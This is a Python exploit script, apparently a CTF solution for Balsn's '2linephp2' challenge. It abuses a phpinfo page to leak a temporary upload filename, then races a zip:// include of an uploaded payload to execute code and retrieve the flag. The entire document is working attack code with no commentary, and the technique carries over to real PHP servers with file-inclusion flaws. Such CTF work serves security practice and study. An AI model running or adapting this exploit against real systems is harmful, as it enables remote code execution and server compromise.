#!/usr/bin/env python3

import socket
import sys

padding = b'A' * 5000

REQ1=b"""POST /phpinfo.php?a=""" + padding + b""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + b"""\r
HTTP_ACCEPT: """ + padding + b"""\r
HTTP_ACCEPT_LANGUAGE: """ + padding + b"""\r
HTTP_PRAGMA: """ + padding + b"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %b\r
Host: %b\r
\r
%b"""

REQ1_DATA = b"""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummy"; filename="test.zip"\r
Content-Type: application/x-zip-compressed\r
\r
%b\r
-----------------------------7dbff1ded0714--\r"""

REQ2 = b"""GET /?kaibro=zi%%70://%b%%23payload HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %b\r
\r
\r
"""

def phpinfo(host, port, offset, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s2.connect((host, port))

    data = REQ1_DATA % payload
    req = REQ1 % (str(len(data)).encode(), host.encode(), data)
    s.send(req)

    d = b''
    while len(d) < offset:
        d += s.recv(1024)

    try:
        i = d.index(b"[tmp_name] =&gt;")
        fn = d[i+17:i+31]
    except ValueError:
        print('offset', 'not found.')

    req2 = REQ2 % (fn, host.encode())
    s2.send(req2)
    res = s2.recv(4096)
    #print('offset', i)
    #print('length', len(d))
    #print('file', fn)

    s.close()
    s2.close()
    return res

if __name__=="__main__":
    with open('./payload.zip', 'rb') as f:
        payload = f.read()
    for i in range(1000):
        try:
            res = phpinfo('2linephp2.balsnctf.com', 50080, 120*1024, payload)
        except socket.ConnectionResetError:
            pass
        if b'z_flag' in res:
            print(res)
            break
        print(i, end='\r')
